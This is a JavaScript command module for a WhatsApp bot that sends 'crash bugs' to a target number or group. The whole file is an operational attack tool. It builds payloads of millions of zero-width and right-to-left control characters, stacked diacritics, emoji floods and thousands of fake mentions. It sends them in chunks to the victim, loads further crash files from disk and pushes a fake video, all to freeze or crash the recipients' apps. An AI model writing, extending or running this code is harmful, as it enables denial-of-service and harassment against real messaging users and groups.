
import { bugsList } from "../bugmenu.js";
import fs from "fs";
import path from "path";

export default {
  name: "bug",
  description: "Send selected bug to a number or group",
  async execute(msg, { sock, args }) {
    try {
      const bugName = args[0]?.toLowerCase();
      let target = args[1];

      if (!bugName || !bugsList[bugName]) {
        console.log(`[DEBUG] Unknown bug command: ${bugName}`);
        return sock.sendMessage(msg.key.remoteJid, { 
          text: "❌ Unknown bug. Type ?bugmenu to see the list.\n\nAvailable bugs: " + Object.keys(bugsList).join(", ") 
        });
      }

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ You selected *${bugName}*. Please type the target number/group as:\n?bug ${bugName} <number/group>`
        });
      }

      // Check for Group-only bug
      if (bugsList[bugName].type.includes("Group only") && !target.includes("@g.us")) {
        return sock.sendMessage(msg.key.remoteJid, { text: "❌ This bug works only in groups." });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" });
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing bug: ${bugName} on target: ${target}`);

      // Handle special bugs that use files
      if (["horla-crash", "uni-crash", "group-crash", "medinv-crash"].includes(bugName)) {
        return await this.handleFileBugs(bugName, target, msg, sock);
      }

      const weight = bugsList[bugName].weight;
      const CHUNK_SIZE = 50_000;
      let payload = "";

      // Generate payload by bug type
      switch(bugName) {
        case "combo-crash":
          payload = ["\u200B","\u200C","\u200D","\u200E","\u200F"].join("").repeat(weight);
          break;

        case "singleline-crash":
          const chars = ["\u200B","\u200C","\u200D","\u200E","\u200F"];
          for(let i=0;i<weight;i++) payload += chars[i % chars.length];
          break;

        case "mentions-crash":
          const PREFIX="23491", UNIQUE_COUNT=2000, TOTAL_COUNT=weight;
          const base=[]; for(let i=0;i<UNIQUE_COUNT;i++) base.push(PREFIX+String(1000000+i).slice(-7)+"@s.whatsapp.net");
          const mentions=[]; while(mentions.length<TOTAL_COUNT) mentions.push(...base);
          mentions.length = TOTAL_COUNT;
          payload = mentions.join("\n");
          break;

        case "ios-heavy":
          const rtl="\u202E", lrm="\u200E", zwj="\u200D", zwnj="\u200C", diacritics="\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307", emoji="👨‍👩‍👧‍👦";
          for(let i=0;i<weight;i++) payload += rtl+emoji+diacritics.repeat(15)+zwj+zwnj+lrm+"\n";
          break;

        case "emoji-bomb":
          payload = "👾👹👺💀☠️👻".repeat(weight);
          break;

        case "rtl-bomb":
          payload = ("\u202E\u200E").repeat(weight);
          break;

        case "media-bomb":
        case "zero-width-wall":
          payload = "\u200B".repeat(weight);
          break;

        case "apocalypse-bug":
          // Ultra-heavy combined payload
          payload += "\u200B".repeat(20_000_000); // Zero-width
          payload += "👾👹👺💀☠️👻".repeat(5_000_000); // Emojis
          payload += ("\u202E\u200E\u200F\u200D\u200C").repeat(2_000_000); // RTL
          break;

        default:
          return sock.sendMessage(msg.key.remoteJid, { text: `❌ Bug ${bugName} not implemented yet.` });
      }

      // Send in chunks to prevent timeout
      const chunks = Math.ceil(payload.length / CHUNK_SIZE);
      for (let i = 0; i < chunks; i++) {
        const chunk = payload.slice(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
        await sock.sendMessage(target, { text: chunk });
        
        // Small delay between chunks
        if (i < chunks - 1) {
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ ${bugName} sent to ${target}! Payload size: ${payload.length} characters`
      });

    } catch (error) {
      console.error(`[ERROR] Bug command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send bug: " + error.message
      });
    }
  },

  async handleFileBugs(bugName, target, msg, sock) {
    try {
      switch(bugName) {
        case "horla-crash":
          return await this.executeHorlaCrash(target, msg, sock);
        case "uni-crash":
          return await this.executeUniCrash(target, msg, sock);
        case "group-crash":
          return await this.executeGroupCrash(target, msg, sock);
        case "medinv-crash":
          return await this.executeMedInvCrash(target, msg, sock);
      }
    } catch (error) {
      console.error(`[ERROR] File bug ${bugName} failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: `❌ Failed to execute ${bugName}: ` + error.message
      });
    }
  },

  async executeHorlaCrash(target, msg, sock) {
    const files = ["combo_invisible.txt", "mentions.json", "singleline_crash.txt"];
    for (const file of files) {
      const filePath = path.join(process.cwd(), "bugs", file);
      if (fs.existsSync(filePath)) {
        const payload = fs.readFileSync(filePath, "utf8");
        await sock.sendMessage(target, { text: payload });
      }
    }
    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Horla crash sent to ${target}` });
  },

  async executeUniCrash(target, msg, sock) {
    const filePath = path.join(process.cwd(), "bugs", "singleline_crash.txt");
    if (fs.existsSync(filePath)) {
      const payload = fs.readFileSync(filePath, "utf8");
      await sock.sendMessage(target, { text: payload });
      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Uni crash sent to ${target}` });
    } else {
      await sock.sendMessage(msg.key.remoteJid, { text: "❌ singleline_crash.txt not found in bugs folder." });
    }
  },

  async executeGroupCrash(target, msg, sock) {
    if (!target.includes("@g.us")) {
      return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Group crash only works in groups." });
    }
    
    const filePath = path.join(process.cwd(), "bugs", "mentions.json");
    if (fs.existsSync(filePath)) {
      const mentions = JSON.parse(fs.readFileSync(filePath, "utf8"));
      await sock.sendMessage(target, { text: "💥 Group Crash 💥", mentions });
      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Group crash sent to ${target}` });
    } else {
      await sock.sendMessage(msg.key.remoteJid, { text: "❌ mentions.json not found in bugs folder." });
    }
  },

  async executeMedInvCrash(target, msg, sock) {
    // Generate invisible payload + fake media
    const payload = "\u200B".repeat(10_000_000);
    await sock.sendMessage(target, { text: payload });
    
    // Try to send fake video
    try {
      await sock.sendMessage(target, {
        video: Buffer.from("fake_video_data"),
        caption: "💣 Media Crash 💣"
      });
    } catch (error) {
      console.log('[DEBUG] Fake video failed, sending text only');
    }
    
    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Media invisible crash sent to ${target}` });
  }
};
